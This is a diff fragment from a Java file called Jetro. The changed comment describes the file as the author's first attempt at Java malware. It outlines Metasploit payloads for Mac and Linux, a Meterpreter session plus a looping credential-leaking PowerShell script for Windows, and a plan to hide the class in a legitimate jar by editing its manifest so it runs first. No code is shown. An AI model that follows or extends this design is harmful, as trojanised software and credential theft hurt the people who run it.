@@ -3,9 +3,9 @@ import java.net.*;
 public class Jetro
 /***
 
-(This was my first ever concept attempt at Java malware)
+(This was my first ever concept attempt at Java malware 2018)
 
-I am not responsible for whatever the fuck you do with this
+I am not responsible for whatever do with this
 Mac and Linux have a generic Metasploit payload with no encoders
 The Windows payload invokes a Meterpreter session and a looping credsleaker powershell script.
 Possible best use for this I could think of is modify a legit jar program's manifest to call this class first then the 'main' one normally
